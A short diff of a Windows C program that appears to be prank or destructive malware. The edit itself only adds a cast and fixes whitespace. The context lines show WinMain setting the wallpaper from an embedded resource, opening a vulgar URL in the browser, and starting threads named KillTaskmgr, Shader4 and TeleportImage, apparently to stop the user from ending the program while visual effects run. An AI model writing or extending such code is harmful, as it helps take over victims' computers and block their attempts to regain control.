@@ -17,7 +17,7 @@ typedef union _RGBQUAD {
 } _RGBQUAD, * PRGBQUAD;
 
 void* GetResource(LPCWSTR name, DWORD* size) {
-    HRSRC hRes = FindResourceW(NULL, name, RT_RCDATA);
+    HRSRC hRes = FindResourceW(NULL, (LPCWSTR)name, RT_RCDATA);
     if (!hRes) return NULL;
     HGLOBAL hData = LoadResource(NULL, hRes);
     if (!hData) return NULL;
@@ -167,7 +167,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     SetWallpaperFromResource();
     ShellExecuteW(NULL, L"open", L"https://FUCKED.BY.PBDROID.LOL/", NULL, NULL, SW_SHOWNORMAL);
-    
+
     CreateThread(0, 0, KillTaskmgr, 0, 0, 0);
     CreateThread(0, 0, Shader4, 0, 0, 0);
     CreateThread(0, 0, TeleportImage, 0, 0, 0);
